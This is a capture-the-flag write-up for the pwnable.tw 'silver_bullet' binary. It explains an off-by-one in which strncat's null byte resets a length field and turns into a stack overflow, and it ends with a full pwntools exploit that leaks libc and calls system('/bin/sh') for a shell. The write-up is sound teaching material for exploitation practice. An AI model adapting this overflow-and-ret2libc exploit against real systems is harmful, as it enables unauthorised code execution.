# Challenge Description
## File type
```bash
$ file silver_bullet
silver_bullet: ELF 32-bit LSB executable, Intel i386, version 1 (SYSV), dynamically linked, interpreter ./ld-2.23.so, for GNU/Linux 2.6.32, BuildID[sha1]=8c95d92edf8bf47b6c9c450e882b7142bf656a92, not stripped
```

## Binary Protection
```bash
$ checksec silver_bullet
[*] './silver_bullet'
    Arch:       i386-32-little
    RELRO:      Full RELRO
    Stack:      No canary found
    NX:         NX enabled
    PIE:        No PIE (0x8046000)
    Stripped:   No
```

## Background
- `silver_bullet` gives us operations to interact with Silver Bullet and Werewolf. Power of a Silver Bullet is based on the length of user's input string.
```
+++++++++++++++++++++++++++
       Silver Bullet       
+++++++++++++++++++++++++++
 1. Create a Silver Bullet 
 2. Power up Silver Bullet 
 3. Beat the Werewolf      
 4. Return                 
+++++++++++++++++++++++++++
Your choice :1
Give me your description of bullet :abc
Your power is : 3
Good luck !!
+++++++++++++++++++++++++++
       Silver Bullet       
+++++++++++++++++++++++++++
 1. Create a Silver Bullet 
 2. Power up Silver Bullet 
 3. Beat the Werewolf      
 4. Return                 
+++++++++++++++++++++++++++
Your choice :2
Give me your another description of bullet :def
Your new power is : 6
Enjoy it !
+++++++++++++++++++++++++++
       Silver Bullet       
+++++++++++++++++++++++++++
 1. Create a Silver Bullet 
 2. Power up Silver Bullet 
 3. Beat the Werewolf      
 4. Return                 
+++++++++++++++++++++++++++
Your choice :3
>----------- Werewolf -----------<
 + NAME : Gin
 + HP : 2147483647
>--------------------------------<
Try to beat it .....
Sorry ... It still alive !!
Give me more power !!
+++++++++++++++++++++++++++
       Silver Bullet       
+++++++++++++++++++++++++++
 1. Create a Silver Bullet 
 2. Power up Silver Bullet 
 3. Beat the Werewolf      
 4. Return                 
+++++++++++++++++++++++++++
Your choice :4
Don't give up !
```

- The program manages all information about Silver Bullet and Werewolf through local variables. Maximum power of Silver Bullet is 48:
```c
int __cdecl main(int argc, const char **argv, const char **envp)
{
  int v3; // eax
  int werewolfHP; // [esp+0h] [ebp-3Ch] BYREF
  const char *werewolfName; // [esp+4h] [ebp-38h]
  char silverBullet[48]; // [esp+8h] [ebp-34h] BYREF
  int powerBullet; // [esp+38h] [ebp-4h]

  init_proc();
  powerBullet = 0;
  memset(silverBullet, 0, sizeof(silverBullet));
  werewolfHP = 0x7FFFFFFF;
  werewolfName = "Gin";
  while ( 1 )
  {
    while ( 1 )
    {
      while ( 1 )
      {
        while ( 1 )
        {
          menu();
          v3 = read_int();
          if ( v3 != 2 )
            break;
          power_up((int)silverBullet);
        }
        if ( v3 > 2 )
          break;
        if ( v3 != 1 )
          goto LABEL_15;
        create_bullet((int)silverBullet);
      }
      if ( v3 == 3 )
        break;
      if ( v3 == 4 )
      {
        puts("Don't give up !");
        exit(0);
      }
LABEL_15:
      puts("Invalid choice");
    }
    if ( beat((int)silverBullet, (int)&werewolfHP) )
      return 0;
    puts("Give me more power !!");
  }
}
```

- These are 3 following important operations of the program:
	- Create a Silver Bullet:
	```c
	int __cdecl create_bullet(int silverBullet)
	{
		int powerBullet; // [esp+0h] [ebp-4h]

		if ( *(_BYTE *)silverBullet )
			return puts("You have been created the Bullet !");
		printf("Give me your description of bullet :");
		read_input(silverBullet, 48);
		powerBullet = strlen(silverBullet);
		printf("Your power is : %u\n", powerBullet);
		*(_DWORD *)(silverBullet + 48) = powerBullet;
		return puts("Good luck !!");
	}
	```

	- Power up Silver Bullet:
	```c
	int __cdecl power_up(int silverBullet)
	{
		char addedBullet[48]; // [esp+0h] [ebp-34h] BYREF
		int addedPower; // [esp+30h] [ebp-4h]

		addedPower = 0;
		memset(addedBullet, 0, sizeof(addedBullet));
		if ( !*(_BYTE *)silverBullet )
			return puts("You need create the bullet first !");
		if ( *(_DWORD *)(silverBullet + 48) > 47u )
			return puts("You can't power up any more !");
		printf("Give me your another description of bullet :");
		read_input((int)addedBullet, 48 - *(_DWORD *)(silverBullet + 48));
		strncat(silverBullet, (int)addedBullet, 48 - *(_DWORD *)(silverBullet + 48));
		addedPower = strlen(addedBullet) + *(_DWORD *)(silverBullet + 48);
		printf("Your new power is : %u\n", addedPower);
		*(_DWORD *)(silverBullet + 48) = addedPower;
		return puts("Enjoy it !");
	}
	```

	- Beat the Werewolf:
	```c
	int __cdecl beat(int bullets, int werewolf)
	{
		if ( *(_BYTE *)bullets )
		{
			puts(">----------- Werewolf -----------<");
			printf(" + NAME : %s\n", *(const char **)(werewolf + 4));
			printf(" + HP : %d\n", *(_DWORD *)werewolf);
			puts(">--------------------------------<");
			puts("Try to beat it .....");
			usleep(1000000);
			*(_DWORD *)werewolf -= *(_DWORD *)(bullets + 48);
			if ( *(int *)werewolf <= 0 )
			{
				puts("Oh ! You win !!");
				return 1;
			}
			else
			{
				puts("Sorry ... It still alive !!");
				return 0;
			}
		}
		else
		{
			puts("You need create the bullet first !");
			return 0;
		}
	}
	```

# Vulnerability
- If we first create a Silver Bullet with length n, and then power it up by 48 - n; the program will show us that the power of our bullet is 48 - n instead 48 as we expected.
```
+++++++++++++++++++++++++++
       Silver Bullet       
+++++++++++++++++++++++++++
 1. Create a Silver Bullet 
 2. Power up Silver Bullet 
 3. Beat the Werewolf      
 4. Return                 
+++++++++++++++++++++++++++
Your choice :1
Give me your description of bullet :aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaa
Your power is : 47
Good luck !!
+++++++++++++++++++++++++++
       Silver Bullet       
+++++++++++++++++++++++++++
 1. Create a Silver Bullet 
 2. Power up Silver Bullet 
 3. Beat the Werewolf      
 4. Return                 
+++++++++++++++++++++++++++
Your choice :2
Give me your another description of bullet :a
Your new power is : 1
Enjoy it !
```

- Therefore, there must be a vulnerable part of code in `power_up()` function. After examining it, I saw the problem that after `strncat()` append all characters from source string to destination string, it will automatically add terminator character at the end of destination string. If we concatenate a 1-long string with destination string (`silverBullet`) that has the length of 47, a null character will be written into `silverBullet + 48`. However, that memory address is also used to store the length of `silverBullet` string and it is updated after `strncat()` is called:
```c
strncat(silverBullet, (int)addedBullet, 48 - *(_DWORD *)(silverBullet + 48));
addedPower = strlen(addedBullet) + *(_DWORD *)(silverBullet + 48);
printf("Your new power is : %u\n", addedPower);
*(_DWORD *)(silverBullet + 48) = addedPower;
```

- It falsifies the actual `silverBullet` string. Then in next time of powering up, we can modify the variable showing the length of `silverBullet` string and do **buffer-overflow** since the binary doesn't have `Stack Canary` mitigation.

# Exploitation
## Buffer Overflow
- First create a Silver Bullet having the power of 47. Then power it up by 1. This allows us to append more 47 characters after `silverBullet` string and modify the variable storing the length of that string (`bulletPower`) and the return address. However, to make `main` function return, we have to beat Werewolf immediately. Therefore, we have to change `bulletPower` variable to a bigger one.
- When we can return to escape `main` function, we just need to write the return address to leak libc by using `printf` or `puts` and `GOTs` entries. After that, just return back to `main` function and do **buffer-overflow** again to get shell.

## Exploit Code
```python
from pwn import *
import utils

context.terminal = "kitty"
context.log_level = "debug"
context.arch = "i386"

TARGET = "./bin/silver_bullet"
LIBC = "./lib/libc_32.so.6"

target = process(TARGET)
target = remote("chall.pwnable.tw", 10103)
# gdb.attach(target, gdbscript="b *(main + 48)")

exe = ELF(TARGET)
libc = ELF(LIBC)
def create_bullet(data: bytes):
	target.sendafter(b"Your choice :", b"1")
	target.sendafter(b"bullet :", data)

def power_up(data: bytes):
	target.sendafter(b"Your choice :", b"2")
	target.sendafter(b"bullet :", data)

def beat():
	target.sendafter(b"Your choice :", b"3")

create_bullet(b"A" * 47)
power_up(b"A")
payload = b"\xff" * 3 + b"A" * 4 + p32(exe.plt['printf']) + p32(exe.symbols['main']) + p32(exe.got['printf'])
power_up(payload)
beat()

target.recvuntil(b"You win !!\n")
printf_addr = u32(target.recv(4))
libc.address = printf_addr - libc.symbols['printf']
system_addr = libc.symbols['system']
bin_sh_addr = libc.address + 0x158e8b

create_bullet(b"A" * 47)
power_up(b"A")
payload = b"\xff" * 3 + b"B" * 4 + p32(system_addr) + b"C" * 4 + p32(bin_sh_addr)
power_up(payload)
beat()

target.interactive()
```

